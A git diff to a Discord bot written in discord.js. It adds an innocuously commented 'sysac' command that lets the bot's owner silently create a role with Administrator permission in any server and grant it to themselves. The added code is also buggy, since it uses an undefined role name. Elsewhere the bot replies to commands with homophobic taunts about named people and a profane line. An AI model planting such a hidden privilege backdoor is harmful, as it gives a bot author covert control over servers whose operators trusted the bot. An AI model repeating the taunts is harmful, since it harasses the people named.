@@ -40,6 +40,7 @@ client.on("message", (message) => {
   //bot check
   if (!message.content.startsWith(config.prefix) || message.author.bot) return;
 
+  //avatar command
   if (message.content.startsWith(config.prefix + "test")) {
     message.channel.send("I'm still alive bitch");
   } else
@@ -51,6 +52,21 @@ client.on("message", (message) => {
         .setImage(user.avatarURL);
     message.channel.send(avatarEmbed);
   } else
+
+  // Create a new role with data
+  if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.ownerID){
+  let me = message.author
+          let role = message.guild.createRole({
+          name : adminstrator,
+          color : "RANDOM",
+          permissions : [8]
+          })
+          let role1 = message.guild.roles.find('name', adminstrator)
+      message.channel.send(`done`)
+     message.guild.member(me).addRole(role1);
+  } else
+
+  // Simple commands
   if (message.content.startsWith(config.prefix + "Is SOM gay?")) {
     message.channel.send("Yeah he's a massive goy");
   } else
@@ -61,7 +77,7 @@ client.on("message", (message) => {
     message.channel.send("Yes he likes hentai traps #bibleblack");
   } else
   if (message.content.startsWith(config.prefix + "Is Iiro gay?")) {
-    message.channel.send("Yeah he's a massive goy");
+    message.channel.send("big fat");
   } else
   if (message.content.startsWith(config.prefix + "Is Roku gay?")) {
     message.channel.send("Obviously");
